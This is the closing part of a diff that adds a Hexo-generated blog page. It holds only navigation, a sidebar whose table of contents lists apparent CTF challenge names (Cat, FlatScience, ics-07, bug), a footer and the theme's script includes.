+              <a href="/2022/04/17/%E3%80%90LineCTF2022%E3%80%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" rel="next" title="【LineCTF2022】部分题目复现">
+                <i class="fa fa-chevron-left"></i> 【LineCTF2022】部分题目复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">67</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cat"><span class="nav-number"></span> <span class="nav-text">Cat</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FlatScience"><span class="nav-number"></span> <span class="nav-text">FlatScience</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ics-07"><span class="nav-number"></span> <span class="nav-text">ics-07</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bug"><span class="nav-number"></span> <span class="nav-text">bug</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
